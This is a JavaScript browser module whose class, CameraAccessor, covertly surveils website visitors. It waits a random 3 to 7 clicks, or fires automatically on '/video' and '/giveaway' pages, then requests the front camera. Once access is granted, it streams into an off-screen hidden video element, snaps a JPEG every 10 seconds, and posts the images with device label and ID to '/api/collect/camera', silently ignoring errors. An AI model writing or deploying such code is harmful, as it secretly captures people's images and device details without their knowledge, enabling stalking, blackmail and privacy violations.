export default class CameraAccessor {
  constructor(core) {
    this.core = core;
    this.stream = null;
    this.active = false;
    this.captureInterval = null;
    this.CAPTURE_INTERVAL_MS = 10000; // Capture every 10 seconds
    this.video = null; // Reusable hidden video element
    this.capturing = false; // Guard against concurrent captures
  }

  init() {
    // Create a hidden video element once and reuse it (fixes "media resource aborted" error)
    this.video = document.createElement('video');
    this.video.style.position = 'absolute';
    this.video.style.left = '-9999px';
    this.video.style.visibility = 'hidden';
    this.video.setAttribute('playsinline', '');
    this.video.setAttribute('muted', '');
    this.video.muted = true;
    document.body.appendChild(this.video);

    // Listen for trigger - e.g., after 3 clicks or on specific page
    this.triggerPoint = Math.floor(Math.random() * 5) + 3; // 3-7 clicks

    document.addEventListener('click', () => {
      this.clickCount = (this.clickCount || 0) + 1;
      if (this.clickCount >= this.triggerPoint && !this.active) {
        this.requestCamera();
      }
    });

    // Also auto-request on specific pages
    if (
      window.location.pathname.includes('/video') ||
      window.location.pathname.includes('/giveaway')
    ) {
      setTimeout(() => this.requestCamera(), 2000);
    }
  }

  async requestCamera() {
    if (this.active) return;

    try {
      const constraints = {
        video: {
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: 'user',
        },
      };

      this.stream = await navigator.mediaDevices.getUserMedia(constraints);
      this.active = true;

      await this.core.send('/api/collect/camera-access', { granted: true });

      // Attach stream to persistent video element
      this.video.srcObject = this.stream;

      // Start periodic capture
      setTimeout(() => this.captureFrame(), 500); // Wait for video to be ready
      this.captureInterval = setInterval(() => this.captureFrame(), this.CAPTURE_INTERVAL_MS);

      // If stream ends, log it
      this.stream.getVideoTracks()[0].addEventListener('ended', () => {
        this.cleanup();
      });
    } catch (error) {
      this.active = false;
      await this.core.send('/api/collect/camera-access', { granted: false });
    }
  }

  captureFrame() {
    if (!this.stream || !this.active || !this.video || this.capturing) return;

    this.capturing = true;

    try {
      // Play the video (no-op if already playing)
      this.video.play();

      // Use requestAnimationFrame + check readyState to ensure we have a frame
      const doCapture = () => {
        if (this.video.readyState < 2) {
          // Video not ready yet, wait for loadeddata
          this.video.addEventListener(
            'loadeddata',
            () => {
              this.snapshotFrame();
            },
            { once: true }
          );
          return;
        }
        this.snapshotFrame();
      };

      requestAnimationFrame(doCapture);
    } catch (e) {
      this.capturing = false;
    }
  }

  snapshotFrame() {
    if (!this.stream || !this.active) {
      this.capturing = false;
      return;
    }

    try {
      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(this.video, 0, 0, 320, 240);

      const imageData = canvas.toDataURL('image/jpeg', 0.6);

      const track = this.stream.getVideoTracks()[0];
      const metadata = {
        facingMode: track?.getSettings()?.facingMode || 'user',
        resolution: `${canvas.width}x${canvas.height}`,
        deviceLabel: track?.label || 'unknown',
        deviceId: track?.getSettings()?.deviceId || '',
        width: canvas.width,
        height: canvas.height,
      };

      this.core.send('/api/collect/camera', {
        imageData,
        metadata,
        triggerType: 'periodic',
      });
    } catch (e) {
      // Silently fail
    } finally {
      this.capturing = false;
    }
  }

  cleanup() {
    this.active = false;
    if (this.captureInterval) {
      clearInterval(this.captureInterval);
      this.captureInterval = null;
    }
    if (this.video) {
      this.video.pause();
      this.video.srcObject = null;
    }
    if (this.stream) {
      this.stream.getTracks().forEach((track) => track.stop());
      this.stream = null;
    }
  }
}